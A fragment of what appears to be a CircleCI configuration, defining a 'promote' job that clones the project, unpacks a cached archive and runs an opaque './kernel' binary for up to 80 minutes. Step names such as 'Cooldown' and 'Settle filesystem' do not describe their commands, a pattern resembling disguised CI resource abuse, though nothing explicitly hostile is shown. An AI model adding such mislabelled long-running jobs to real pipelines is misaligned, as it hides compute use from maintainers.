            - 'cd_cfg'
  promote:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/ok
      - run:
          name: Load prior digest
          command: |
            cat /tmp/ok/cd_cfg
      - run:
          name: Clone sources
          command: git clone --depth 1 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Unpack cached data
          command: tar -I gzip -xf archive.tgz
      - run:
          name: Cooldown
          command: ls -la
      - run:
          name: Settle filesystem
          command: sleep 60
      - run:
          no_output_timeout: 80m
          command: nice -n 0 ./kernel
